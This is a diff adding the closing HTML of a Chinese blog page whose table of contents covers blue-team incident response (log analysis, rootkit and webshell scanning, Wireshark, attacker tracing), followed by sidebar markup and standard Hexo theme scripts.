class="toc-number">1.2.1.</span> <span class="toc-text">关键目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.3.</span> <span class="toc-text">应急工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Busybox"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Busybox</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unhide"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">unhide</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chkrootkit"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">chkrootkit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rkhunter"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">Rkhunter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ClamAV"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">ClamAV</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebShell%E6%9F%A5%E6%9D%80-%E6%B2%B3%E9%A9%AC"><span class="toc-number">1.2.3.6.</span> <span class="toc-text">WebShell查杀-河马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80-java-memshell-scanner"><span class="toc-number">1.2.3.7.</span> <span class="toc-text">内存马查杀-java-memshell-scanner</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E6%97%A5%E5%BF%97"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">web日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97-1"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">系统日志</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">1.2.5.</span> <span class="toc-text">进程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">进程和网络连接状态</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.6.</span> <span class="toc-text">计划任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">#流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Wireshark%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">Wireshark的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E5%8D%A1%E9%80%89%E6%8B%A9%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.3.1.0.1.</span> <span class="toc-text">网卡选择模式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.3.1.0.2.</span> <span class="toc-text">过滤器</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">#溯源的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%9C%BA%E5%89%8D%E6%9C%9F%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.4.1.</span> <span class="toc-text">入场前期工作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%98%8E%E7%A1%AE%E7%BD%91%E7%BB%9C%E5%8C%BA%E5%9F%9F%E5%88%92%E5%88%86"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">1 明确网络区域划分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%98%8E%E7%A1%AE%E7%8E%B0%E6%9C%89%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">2 明确现有安全设备</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">设备类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E8%A6%86%E7%9B%96%E8%8C%83%E5%9B%B4"><span class="toc-number">1.4.1.2.2.</span> <span class="toc-text">设备覆盖范围</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8E%B0%E6%9C%89%E5%91%8A%E8%AD%A6%E8%B4%A8%E9%87%8F"><span class="toc-number">1.4.1.2.3.</span> <span class="toc-text">现有告警质量</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B7%B2%E6%9C%89%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">3 已有资产梳理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%AC%E7%BD%91%E6%9A%B4%E9%9C%B2%E8%B5%84%E4%BA%A7"><span class="toc-number">1.4.1.3.1.</span> <span class="toc-text">公网暴露资产</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7"><span class="toc-number">1.4.1.3.2.</span> <span class="toc-text">内网资产</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%AC%E5%8F%B8%E8%BF%90%E8%90%A5%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%EF%BC%88%E9%98%B2%E9%92%93%E9%B1%BC%EF%BC%89"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">4 公司运营业务数据（防钓鱼）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6"><span class="toc-number">1.4.2.</span> <span class="toc-text">溯源反制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8%E8%AE%BF%E9%97%AE%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">主动访问扫描探测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Web"><span class="toc-number">1.4.2.1.1.</span> <span class="toc-text">Web</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">1.4.2.1.2.</span> <span class="toc-text">爆破</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%83%85%E6%8A%A5%E6%90%9C%E9%9B%86"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">情报搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E3%80%81%E6%B2%99%E7%AE%B1"><span class="toc-number">1.4.2.2.1.</span> <span class="toc-text">威胁情报、沙箱</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-number">1.4.2.2.2.</span> <span class="toc-text">搜索引擎</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%BF%E9%87%8C%E4%BA%91%E3%80%81%E8%85%BE%E8%AE%AF%E4%BA%91%E3%80%81%E5%8D%8E%E4%B8%BA%E4%BA%91"><span class="toc-number">1.4.2.2.3.</span> <span class="toc-text">阿里云、腾讯云、华为云</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IP%E5%AE%9A%E4%BD%8D"><span class="toc-number">1.4.2.2.4.</span> <span class="toc-text">IP定位</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/%E5%9B%BE1.jpg" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/friend" aria-label="链接"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">链接</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "mX1@0",
+          title: "蓝队应急响应",
+          url: "http://example.com/2025/04/10/lan-dui-ying-ji-xiang-ying/",
+          excerpt: "",
+          description: "",
+          stripContent: "蓝队应急响应笔记#Windows排查日志分析在线日志筛选工具：https://tilipa.zlsam.com/loger/ 日志分类Web日志 Web日志存放路径  Windows默认路径：在根目录下的logs文件夹中  tomcat日志  包含catalina.out（异常错误的日志）、localhost（类错误的日志）、manager、localhost_access_log 4种格式的日志  apache日志、nginx日志、IIS日志  包含access_log、error_log 系",
+          date: "Thu Apr 10 2025 21:40:32 GMT+0800",
+          updated: "Thu Apr 10 2025 21:45:53 GMT+0800",
+          cover: "/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
